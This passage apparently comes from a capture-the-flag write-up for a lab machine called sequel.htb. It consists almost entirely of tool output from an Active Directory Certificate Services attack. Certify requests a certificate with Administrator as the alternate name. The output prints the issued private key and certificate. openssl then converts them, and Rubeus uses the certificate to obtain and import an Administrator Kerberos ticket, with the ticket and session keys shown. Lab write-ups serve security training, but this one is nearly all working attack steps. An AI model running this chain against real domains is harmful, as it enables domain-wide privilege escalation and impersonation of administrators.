</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   _____          _   _  __
</span></span><span class="line"><span class="cl">  / ____|        | | (_)/ _|
</span></span><span class="line"><span class="cl"> | |     ___ _ __| |_ _| |_ _   _
</span></span><span class="line"><span class="cl"> | |    / _ \ &#39;__| __| |  _| | | |
</span></span><span class="line"><span class="cl"> | |___|  __/ |  | |_| | | | |_| |
</span></span><span class="line"><span class="cl">  \_____\___|_|   \__|_|_|  \__, |
</span></span><span class="line"><span class="cl">                             __/ |
</span></span><span class="line"><span class="cl">                            |___./
</span></span><span class="line"><span class="cl">  v1.0.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Action: Request a Certificates
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Current user context    : sequel\Ryan.Cooper
</span></span><span class="line"><span class="cl">[*] No subject name specified, using current context as subject.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Template                : UserAuthentication
</span></span><span class="line"><span class="cl">[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
</span></span><span class="line"><span class="cl">[*] AltName                 : Administrator
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] CA Response             : The certificate had been issued.
</span></span><span class="line"><span class="cl">[*] Request ID              : 10
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] cert.pem         :
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-----BEGIN RSA PRIVATE KEY-----
</span></span><span class="line"><span class="cl">MIIEpAIBAAKCAQEA2JtqGlwdUZBoJPQKIjuIZbMfoLIPxw9hNUEoqXy0Cv07G0JZ
</span></span><span class="line"><span class="cl">Etvuy6eLPwPLFKmZiRZlHEQlJLxqOLRkGAboFbpmTywqWWfAnqSCbjpn0BHlCR8e
</span></span><span class="line"><span class="cl">0yL2MdsSIDdkcb0cz+SOk+iudsSxxT4ECSE39TBo2XUzMMJ8gBAq+/r1rlUPvE5S
</span></span><span class="line"><span class="cl">23DPNbXfaVvPS6GC9SFqOrRwz2crMFxVQSvL2TU5y8sOVwHKy5CU7hUcbjJYl4YF
</span></span><span class="line"><span class="cl">fXERiCodMi0WFL4PgQV6bmJcfoiUmn1l+FiMvu/FuIgY/m6Jhw8pNdwXzk9bfspM
</span></span><span class="line"><span class="cl">3hG00Lm2m/fVA2S+/UpVVT+sgzEiITBMu7j2HQIDAQABAoIBAQDQf+kGLpzaIlLd
</span></span><span class="line"><span class="cl">HzuR8BQ/MMjE+iFNz3QWuv3VB4CXA2KdvqPXD3Uw+7mBkrkszoRH/RKevsmyLttg
</span></span><span class="line"><span class="cl">cePXbO6B28cXdr/dB43WJyyVxgqfslnxCc+2FPU+0E0GTcuV4B+Xzb2gil1FXdhw
</span></span><span class="line"><span class="cl">sF1aHGuszEhg6fu4d7032FhH7S4H+3r9VrX/a481LI3dhoLbAqvEsnd+QuqKZwnJ
</span></span><span class="line"><span class="cl">LsNtt65O6DMNoJa/TKWs5FHiPDQv6xFYkNtN9K3W2riTh4eJyAfydKBGbLLMe9CL
</span></span><span class="line"><span class="cl">3N5tunVqS2Mu3SOPAPp82DcTJZ73EV5oLZRaccJqA/v+LnYqblNWiiq5CRl9OYoA
</span></span><span class="line"><span class="cl">JwfVy8XRAoGBAPjc5kltXiuxehD3HxYr15OSylvxfH/wE1H/T9ckFrgm8Wtqcy8A
</span></span><span class="line"><span class="cl">GxbXXllPLghy7Drjae5393zwgclkvlrkR7ddtkGRaSFHO15zS38SHCnt64cNBcqj
</span></span><span class="line"><span class="cl">qGGv97aP9MipxZWLo1hSsNDPjGCSJ7ewKMKGxpu9gqObkXik8Wx1HeDLAoGBAN7R
</span></span><span class="line"><span class="cl">swySBWYS/3VjI71zuE/OhPntfwC1s5HVWaRz0LTO0tZkQBMGDOjuEYvD/CuVNUMB
</span></span><span class="line"><span class="cl">xcAu6oaaH2CmOyYOv96lJkXq9j1WcNqBt4RkHSy6MNAR6t1o1D0+RP7+zh/OdPDx
</span></span><span class="line"><span class="cl">Zi2RicbBPpU40/n3rphvk8YL0QXT0v3nHXQqSC+3AoGAAYD0M0Vh6EmuPyP/IBcr
</span></span><span class="line"><span class="cl">ukyMxHl1EyDUPQ6Z4Obq7DnwA4IlKAeMIlsyyr9bu9lV7BUrsrEu4aZiYmEldU8j
</span></span><span class="line"><span class="cl">z8vVKhhC1lyj0zJHJoFpgidZ4PsHKe5LOiviB0xfYkcEVp79Ya8+OkTGyF6ZttZt
</span></span><span class="line"><span class="cl">qJ8/2/kNLQfnnR8CBnG+uHkCgYEAmsGuyBZLJaAgSZm34weShet8NFIdmZKZy7oQ
</span></span><span class="line"><span class="cl">7sV5uXrEuR8b2ZqkMMvY5+gRJvwU6Bs9C8QKI767+Fa8UiyAWtT9hiYxLFzzOPBL
</span></span><span class="line"><span class="cl">U+ps0PnomTs4ktsSPg8XwLuc0j6EviwLua6RsLfbDa1QnRbH7xvf2PewD4oVyz9Q
</span></span><span class="line"><span class="cl">F7SeOnUCgYBjJQuKadpSFCHSQbGpi+xQbAiJGYaas0NBLZ393m3LCh580LKa7QHr
</span></span><span class="line"><span class="cl">R0tdvEEhrSGUFkS4UvZoBoXEqp3SF7dcBDaPNl1KwQyWcExxdHq+N6HGZeSEKssf
</span></span><span class="line"><span class="cl">Qug2RmX9zQeP5MaHEU+jKrFC8lViHfkGcWRnBMaJraPCQaFWKDRyGg==
</span></span><span class="line"><span class="cl">-----END RSA PRIVATE KEY-----
</span></span><span class="line"><span class="cl">-----BEGIN CERTIFICATE-----
</span></span><span class="line"><span class="cl">MIIGEjCCBPqgAwIBAgITHgAAAAoaz+dKUyVfWQAAAAAACjANBgkqhkiG9w0BAQsF
</span></span><span class="line"><span class="cl">ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
</span></span><span class="line"><span class="cl">MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwNjE2MDAyODUwWhcNMjUwNjE2
</span></span><span class="line"><span class="cl">MDAzODUwWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
</span></span><span class="line"><span class="cl">c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
</span></span><span class="line"><span class="cl">MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDYm2oaXB1RkGgk9AoiO4hlsx+g
</span></span><span class="line"><span class="cl">sg/HD2E1QSipfLQK/TsbQlkS2+7Lp4s/A8sUqZmJFmUcRCUkvGo4tGQYBugVumZP
</span></span><span class="line"><span class="cl">LCpZZ8CepIJuOmfQEeUJHx7TIvYx2xIgN2RxvRzP5I6T6K52xLHFPgQJITf1MGjZ
</span></span><span class="line"><span class="cl">dTMwwnyAECr7+vWuVQ+8TlLbcM81td9pW89LoYL1IWo6tHDPZyswXFVBK8vZNTnL
</span></span><span class="line"><span class="cl">yw5XAcrLkJTuFRxuMliXhgV9cRGIKh0yLRYUvg+BBXpuYlx+iJSafWX4WIy+78W4
</span></span><span class="line"><span class="cl">iBj+bomHDyk13BfOT1t+ykzeEbTQubab99UDZL79SlVVP6yDMSIhMEy7uPYdAgMB
</span></span><span class="line"><span class="cl">AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
</span></span><span class="line"><span class="cl">lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
</span></span><span class="line"><span class="cl">KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
</span></span><span class="line"><span class="cl">CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
</span></span><span class="line"><span class="cl">hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
</span></span><span class="line"><span class="cl">Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAuMQpb7ZsEqSmYgEGOu7y5wj1Ms
</span></span><span class="line"><span class="cl">MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
</span></span><span class="line"><span class="cl">IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
</span></span><span class="line"><span class="cl">gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
</span></span><span class="line"><span class="cl">bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
</span></span><span class="line"><span class="cl">bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
</span></span><span class="line"><span class="cl">ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
</span></span><span class="line"><span class="cl">gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
</span></span><span class="line"><span class="cl">QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
</span></span><span class="line"><span class="cl">bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
</span></span><span class="line"><span class="cl">b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
</span></span><span class="line"><span class="cl">AAOCAQEAN2rOzjeX+iCItQ86bpsxsQm/qc87nobXuC8fO/u/ThRJ3i+aFdLbM0GH
</span></span><span class="line"><span class="cl">0cSd75zve1oIRTmQOr194m/Riu0kVVco/vHSqN4oJezfgdWf4bwSh60QNTU/ATnp
</span></span><span class="line"><span class="cl">ei3Zi7GYRPMRxC6CtXHbxohU+aplrXMMZ8noD094ix0jcyE2CG9AI3awle0Xa47U
</span></span><span class="line"><span class="cl">Ix8b6Njph+m4Kx7UGVdk8ZMoaAx4D1VWnimnQ7qsGL7yi3eGkoH0i2yR5g+9Xd8s
</span></span><span class="line"><span class="cl">kyPkC1OGGB2610j8CEKrzzkQGHPdhdoIU+kHFmq+zkZUN9MHVGTHI/6uwSs83OuK
</span></span><span class="line"><span class="cl">EDoXyL/FliGefbiTsT6xpFzmJ1KVlQ==
</span></span><span class="line"><span class="cl">-----END CERTIFICATE-----
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP &#34;Microsoft Enhanced Cryptographic Provider v1.0&#34; -export -out cert.pfx
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Certify completed in 00:00:12.9065614
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">openssl pkcs12 -in certif.pem -keyex -CSP &#34;Microsoft Enhanced Cryptographic Provider v1.0&#34; -export -out cert.pfx
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   ______        _
</span></span><span class="line"><span class="cl">  (_____ \      | |
</span></span><span class="line"><span class="cl">   _____) )_   _| |__  _____ _   _  ___
</span></span><span class="line"><span class="cl">  |  __  /| | | |  _ \| ___ | | | |/___)
</span></span><span class="line"><span class="cl">  | |  \ \| |_| | |_) ) ____| |_| |___ |
</span></span><span class="line"><span class="cl">  |_|   |_|____/|____/|_____)____/(___/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  v2.2.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Action: Ask TGT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
</span></span><span class="line"><span class="cl">[*] Building AS-REQ (w/ PKINIT preauth) for: &#39;sequel.htb\Administrator&#39;
</span></span><span class="line"><span class="cl">[*] Using domain controller: fe80::4cb0:8b67:3bf3:1420%4:88
</span></span><span class="line"><span class="cl">[+] TGT request successful!
</span></span><span class="line"><span class="cl">[*] base64(ticket.kirbi):
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMC
</span></span><span class="line"><span class="cl">      AQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBDfgOUYGIS2X
</span></span><span class="line"><span class="cl">      c5xYwUqn/MyOAu9WBp0jo+czd8KgYvAM/Jy+Hv79oSQAAWubl83tiV7GA9BFYJDW4hTZDiTLol3nRHnT
</span></span><span class="line"><span class="cl">      dZ5Mkandxk3zsy5tNweoAeasM6mHjuuzXortlr2jaHWEwYOocH2ZTrMOAZxZ+tpWCc0h9/ZiNq0RF8N2
</span></span><span class="line"><span class="cl">      pM5VELvawn66iLxbN3kuz5ZEHWoZWauGkMOZNrzihKoE1spkAqC88MkbC2k5JGlHwSmUBVbeEV8pl38+
</span></span><span class="line"><span class="cl">      +Vl3kRqN+BomxGYY0zHgnE+QqQpN68WjjMIhUuMpxMYcSBR4V2SX3jk5muJGtFqp3Vz8IQkTWm6A0+s0
</span></span><span class="line"><span class="cl">      ejP6bRUkiiv+bUwX/E+0Bmbx31oiBdzlqz2BFlhCFU676UWP/Llxvs6MJyrTZtn3feHqDhc0YzeqKtrU
</span></span><span class="line"><span class="cl">      eJFtNmHhXA+xOQp5GX4yOA/nJO0yBYdVyVcagHldW89mstpyJ9I5dOrpVFt+wCp4qQlX0U589JyCrXAF
</span></span><span class="line"><span class="cl">      V3nseWJbvHq8Q8J5D1dmvGWP9KGUwBqbkhdMzQnrCzmMFF2bMcHCj9kG69v/JCmyOzfO2Jw/clMZ6SmX
</span></span><span class="line"><span class="cl">      cETwsGI8bVMEOIOz8yCbrHsGyyTKQVLYOiQvyTXf7+vMXmmzgJKMIVW5Xpl4iBAFK0dCNBf+jCKs0rjH
</span></span><span class="line"><span class="cl">      gnsoeBWB2SX2d6dFuiNO8rwjDbl2vZItNLN+gQxzeDkLGPqTbOwgKKvQV7M/0bdxdsojRuAQWTTD/h+d
</span></span><span class="line"><span class="cl">      8wI4dhwHvg8Kvp8lT/cbhgebSVqMXMK9P6jLob27wkhseT9aMhYgeJVzir4WetvvdRJdGbdblF6cRGgH
</span></span><span class="line"><span class="cl">      3DX3lq9w1dC1e0/n9cWrQOQxXZNgjsLPSGdWU4XOaGLk0vWHr72bokHuSx6fj5qIHyadc/BWVUT6m7an
</span></span><span class="line"><span class="cl">      pQfLUeEDPUUeBw83XLEblfmdKMBltgaOoepbip7421QQe7A9VxaxlXUPXJLf8vy3MIUYfRwIoFVx9X6a
</span></span><span class="line"><span class="cl">      bNUMhKRjp8Fv97pA86M5YqJWlRPQMhZP1QSxlURg/CAKPLG9ZYQbAvVtXECVaP0G7TFnF4J6jqOBH407
</span></span><span class="line"><span class="cl">      PvKqNsHhTGutjlXYucpzLKrbrprtc9RCDdteqJKbDlOcwahZRPylXMmJWyn++K7CC+N1Q49QSrpsmlAj
</span></span><span class="line"><span class="cl">      xAS+ZR2pmTS/M6912kjIrCGzLB3nHSQL3+ZTTD/oNPjHEMrHz13GivIQTrA0d8Y7o/71bks+kZEKSWMJ
</span></span><span class="line"><span class="cl">      nxBgZ/x2GDGRrAK8chfiscXPdA6rAsxp1dWYvUyIg4409iiCt3wq6TmvrWtvHVLFVWclXNuKrjNjQzpd
</span></span><span class="line"><span class="cl">      K5KkDWwYR6s6giONSSk+1jp2CqwCpaI5T8zqZlCASk7/1de2YsrhQTHgLMoubrJT9hQU3QDJvGXMJG0o
</span></span><span class="line"><span class="cl">      rd6uGH2kCM7bx56lF8AAcDuCejB8Ua9IWjxtEVzdqZ0XWinrfC0joV7z9lHo2GiExCYCgZvTdD0uOa5E
</span></span><span class="line"><span class="cl">      m19mC+8VnDpOL4nhRh4Oi6enQN3cporZ/jI4klyJNZO5BEgGVQkvrY1GYmKF5T+Bj7wh6XFfLtWGq000
</span></span><span class="line"><span class="cl">      BhfeixwnyQNBOxce/U9pWQNh3u94Ke1q1j1hc5cKp1pkM0tk6Ol0S/fc1FzIuBTdw9wfBzNOXEwj8t2P
</span></span><span class="line"><span class="cl">      wdTkS5iq6jcsHJegErKCVaholQwYJGyLqpFkmBaXYZvWLKtQs72QYD4AEo7w3NSEynU+LxdGxWa7inEo
</span></span><span class="line"><span class="cl">      uC+YFVoPVOSZAc/efFyyRKOB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIE
</span></span><span class="line"><span class="cl">      EOvVmJIsSJi03aiT9NnsTvqhDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3Kj
</span></span><span class="line"><span class="cl">      BwMFAADhAAClERgPMjAyMzA2MTYwMDQxNDlaphEYDzIwMjMwNjE2MTA0MTQ5WqcRGA8yMDIzMDYyMzAw
</span></span><span class="line"><span class="cl">      NDE0OVqoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==
</span></span><span class="line"><span class="cl">[+] Ticket successfully imported!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  ServiceName              :  krbtgt/sequel.htb
</span></span><span class="line"><span class="cl">  ServiceRealm             :  SEQUEL.HTB
</span></span><span class="line"><span class="cl">  UserName                 :  Administrator
</span></span><span class="line"><span class="cl">  UserRealm                :  SEQUEL.HTB
</span></span><span class="line"><span class="cl">  StartTime                :  6/15/2023 5:41:49 PM
</span></span><span class="line"><span class="cl">  EndTime                  :  6/16/2023 3:41:49 AM
</span></span><span class="line"><span class="cl">  RenewTill                :  6/22/2023 5:41:49 PM
</span></span><span class="line"><span class="cl">  Flags                    :  name_canonicalize, pre_authent, initial, renewable
</span></span><span class="line"><span class="cl">  KeyType                  :  rc4_hmac
</span></span><span class="line"><span class="cl">  Base64(key)              :  69WYkixImLTdqJP02exO+g==
</span></span><span class="line"><span class="cl">  ASREP (key)              :  CB53D6F86965C2B946E20CF15B91858E
</span></span></code></pre></div></div>
  
    <div class="mt-16">

</div>
  
</article>
      </div>
    </main><footer class="fixed left-0 bottom-0 w-full bg-base px-page-gutter">
  <div class="flex justify-center items-center h-footer-height">
    <div
      class="flex flex-row w-full max-w-content justify-between lowercase italic gap-3"
    >
      <nav>
        <ul class="flex text-md space-x-3 sm:space-x-6">
          
        </ul>
      </nav>
      <span class="text-muted hidden md:block">
        &copy;
        2023
        <a
          href="https://github.com/ntk148v/hugo-toigian"
          class="font-bold hover:underline"
          >hugo-toigian</a
        >
      </span>
      <div id="header-theme-button">
        <svg
          id="dark_mode_btn"
          class="hidden toolbox-btn"
          width="18px"
          height="18px"
          xmlns="http://www.w3.org/2000/svg"
          fill="none"
          viewBox="0 0 24 24"
          stroke-width="1.5"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            d="M21.752 15.002A9.718 9.718 0 0118 15.75c-5.385 0-9.75-4.365-9.75-9.75 0-1.33.266-2.597.748-3.752A9.753 9.753 0 003 11.25C3 16.635 7.365 21 12.75 21a9.753 9.753 0 009.002-5.998z"
          />
        </svg>
        <svg
          id="light_mode_btn"
          class="hidden toolbox-btn"
          width="18px"
          height="18px"
          xmlns="http://www.w3.org/2000/svg"
          fill="none"
          viewBox="0 0 24 24"
          stroke-width="1.5"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            d="M12 3v2.25m6.364.386l-1.591 1.591M21 12h-2.25m-.386 6.364l-1.591-1.591M12 18.75V21m-4.773-4.227l-1.591 1.591M5.25 12H3m4.227-4.773L5.636 5.636M15.75 12a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z"
          />
        </svg>
      </div>
    </div>
  </div>
</footer>
</body>
</html>
